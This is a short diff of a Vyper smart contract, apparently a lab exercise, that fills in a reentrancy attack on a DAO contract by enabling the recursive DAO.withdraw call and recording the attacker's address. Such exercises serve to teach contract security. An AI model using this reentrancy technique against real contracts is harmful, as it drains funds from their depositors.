@@ -17,7 +17,7 @@ def _attack() -> bool:
     
     # TODO: Use the DAO interface to withdraw funds.
     # Make sure you add a "base case" to end the recursion
-    #DAO.withdraw(deposit_amount)
+    DAO.withdraw(deposit_amount)
 
     return true
 
@@ -25,7 +25,8 @@ def _attack() -> bool:
 @payable
 def attack(dao_address:address):
     self.dao_address = dao_address
-    deposit_amount: uint256 = msg.value    
+    deposit_amount: uint256 = msg.value
+    self.owner_address = msg.sender   
  
     # Attack cannot withdraw more than what exists in the DAO
     if dao_address.balance < msg.value:
